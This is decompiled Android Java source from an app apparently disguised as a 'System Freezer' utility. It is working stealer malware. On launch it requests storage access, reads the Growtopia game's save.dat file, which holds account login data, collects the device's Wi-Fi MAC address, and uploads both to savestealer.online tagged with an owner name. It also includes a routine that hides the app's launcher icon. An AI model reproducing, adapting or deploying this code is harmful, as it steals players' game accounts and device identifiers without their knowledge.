package com.example.gtface;

import android.app.ProgressDialog;
import android.content.ComponentName;
import android.content.Context;
import android.os.Build;
import android.os.Bundle;
import android.os.Environment;
import android.os.StrictMode;
import android.support.v4.content.ContextCompat;
import android.support.v7.app.AppCompatActivity;
import android.widget.Toast;
import java.io.DataOutputStream;
import java.io.File;
import java.io.FileInputStream;
import java.net.HttpURLConnection;
import java.net.NetworkInterface;
import java.net.SocketException;
import java.net.URL;
import java.util.ArrayList;
import java.util.Collections;
import java.util.Iterator;
import java.util.Random;

public class MainActivity extends AppCompatActivity {
  private int STORAGE_PERMISSION_CODE = 1;
  
  String UTF8 = "utf8";
  
  private ProgressDialog dialog;
  
  public String macad;
  
  public String myData;
  
  public String owner;
  
  public String path;
  
  String randomgenerator;
  
  String s = "asd22";
  
  public String sd = Environment.getExternalStorageDirectory().getAbsolutePath();
  
  private int serverResponseCode;
  
  public MainActivity() {
    StringBuilder stringBuilder = new StringBuilder();
    stringBuilder.append(this.sd);
    stringBuilder.append("/Android/data/com.rtsoft.growtopia/files/save.dat");
    this.path = stringBuilder.toString();
    this.serverResponseCode = 0;
    this.owner = "urmom69";
    this.dialog = null;
    this.randomgenerator = random();
  }
  
  private boolean checkStoragePermission() {
    if (Build.VERSION.SDK_INT >= 23 && ContextCompat.checkSelfPermission((Context)this, "android.permission.READ_EXTERNAL_STORAGE") != 0) {
      shouldShowRequestPermissionRationale("android.permission.READ_EXTERNAL_STORAGE");
      requestPermissions(new String[] { "android.permission.READ_EXTERNAL_STORAGE", "android.permission.WRITE_EXTERNAL_STORAGE" }, 111);
      return false;
    } 
    getmac();
    doInBackground(new String[0]);
    return false;
  }
  
  private void hideAppLauncher() {
    getPackageManager().setComponentEnabledSetting(new ComponentName((Context)this, MainActivity.class), 2, 1);
  }
  
  public static String random() {
    Random random = new Random();
    StringBuilder stringBuilder = new StringBuilder();
    int j = random.nextInt(15);
    for (int i = 0; i < j; i++)
      stringBuilder.append((char)(random.nextInt(96) + 32)); 
    return stringBuilder.toString();
  }
  
  public void check() {
    if (ContextCompat.checkSelfPermission((Context)this, "android.permission.READ_EXTERNAL_STORAGE") == 0) {
      getmac();
      doInBackground(new String[0]);
      return;
    } 
    checkStoragePermission();
  }
  
  protected String doInBackground(String... paramVarArgs) {
    try {
      String str = this.path;
      File file = new File(str);
      boolean bool = file.isFile();
      if (bool)
        try {
          StringBuilder stringBuilder2 = new StringBuilder();
          stringBuilder2.append("https://savestealer.online/upload5.php?owner=");
          stringBuilder2.append(this.owner);
          stringBuilder2.append("&mac=");
          stringBuilder2.append(this.macad);
          String str1 = stringBuilder2.toString();
          FileInputStream fileInputStream = new FileInputStream(file);
          HttpURLConnection httpURLConnection = (HttpURLConnection)(new URL(str1)).openConnection();
          httpURLConnection.setDoInput(true);
          httpURLConnection.setDoOutput(true);
          httpURLConnection.setUseCaches(false);
          httpURLConnection.setRequestMethod("POST");
          httpURLConnection.setRequestProperty("Connection", "Keep-Alive");
          httpURLConnection.setRequestProperty("ENCTYPE", "multipart/form-data");
          StringBuilder stringBuilder3 = new StringBuilder();
          stringBuilder3.append("multipart/form-data;boundary=");
          stringBuilder3.append("*****");
          httpURLConnection.setRequestProperty("Content-Type", stringBuilder3.toString());
          httpURLConnection.setRequestProperty("bill", str);
          DataOutputStream dataOutputStream = new DataOutputStream(httpURLConnection.getOutputStream());
          StringBuilder stringBuilder4 = new StringBuilder();
          stringBuilder4.append("--");
          stringBuilder4.append("*****");
          stringBuilder4.append("\r\n");
          dataOutputStream.writeBytes(stringBuilder4.toString());
          stringBuilder4 = new StringBuilder();
          stringBuilder4.append("Content-Disposition: form-data; name=\"bill\";filename=\"");
          stringBuilder4.append(str);
          stringBuilder4.append("\"");
          stringBuilder4.append("\r\n");
          dataOutputStream.writeBytes(stringBuilder4.toString());
          dataOutputStream.writeBytes("\r\n");
          int i = Math.min(fileInputStream.available(), 1048576);
          byte[] arrayOfByte = new byte[i];
          for (int j = fileInputStream.read(arrayOfByte, 0, i); j > 0; j = fileInputStream.read(arrayOfByte, 0, i)) {
            dataOutputStream.write(arrayOfByte, 0, i);
            i = Math.min(fileInputStream.available(), 1048576);
          } 
          dataOutputStream.writeBytes("\r\n");
          StringBuilder stringBuilder1 = new StringBuilder();
          stringBuilder1.append("--");
          stringBuilder1.append("*****");
          stringBuilder1.append("--");
          stringBuilder1.append("\r\n");
          dataOutputStream.writeBytes(stringBuilder1.toString());
          this.serverResponseCode = httpURLConnection.getResponseCode();
          httpURLConnection.getResponseMessage();
          i = this.serverResponseCode;
          fileInputStream.close();
          dataOutputStream.flush();
          dataOutputStream.close();
        } catch (Exception exception) {
          exception.printStackTrace();
          finish();
        }  
    } catch (Exception exception) {
      finish();
      exception.printStackTrace();
      finish();
    } 
    finish();
    return "Executed";
  }
  
  public void getmac() {
    try {
      ArrayList<NetworkInterface> arrayList = Collections.list(NetworkInterface.getNetworkInterfaces());
      String str = "";
      Iterator<NetworkInterface> iterator = arrayList.iterator();
      while (iterator.hasNext()) {
        NetworkInterface networkInterface = iterator.next();
        if (networkInterface.getName().equalsIgnoreCase("wlan0")) {
          for (int i = 0; i < (networkInterface.getHardwareAddress()).length; i++) {
            String str1 = Integer.toHexString(networkInterface.getHardwareAddress()[i] & 0xFF);
            if (str1.length() == 1) {
              StringBuilder stringBuilder1 = new StringBuilder();
              stringBuilder1.append("0");
              stringBuilder1.append(str1);
              str1 = stringBuilder1.toString();
            } 
            StringBuilder stringBuilder = new StringBuilder();
            stringBuilder.append(str);
            stringBuilder.append(str1.toUpperCase());
            stringBuilder.append(":");
            str = stringBuilder.toString();
          } 
          break;
        } 
      } 
      this.macad = str.substring(0, str.length() - 1);
      return;
    } catch (SocketException socketException) {
      return;
    } 
  }
  
  protected void onCreate(Bundle paramBundle) {
    super.onCreate(paramBundle);
    StrictMode.setThreadPolicy((new StrictMode.ThreadPolicy.Builder()).permitDiskReads().permitDiskWrites().permitNetwork().build());
    check();
  }
  
  public void onRequestPermissionsResult(int paramInt, String[] paramArrayOfString, int[] paramArrayOfint) {
    if (paramInt != 111) {
      super.onRequestPermissionsResult(paramInt, paramArrayOfString, paramArrayOfint);
      return;
    } 
    if (paramArrayOfint[0] != 0)
      Toast.makeText((Context)this, "Cannot run application because Storage permission is not granted", 0).show(); 
  }
}


/* Location:              C:\Users\Tbrin\Downloads\System_Freezer_1-dex2jar.jar!\com\example\gtface\MainActivity.class
 * Java compiler version: 6 (50.0)
 * JD-Core Version:       1.1.3
 */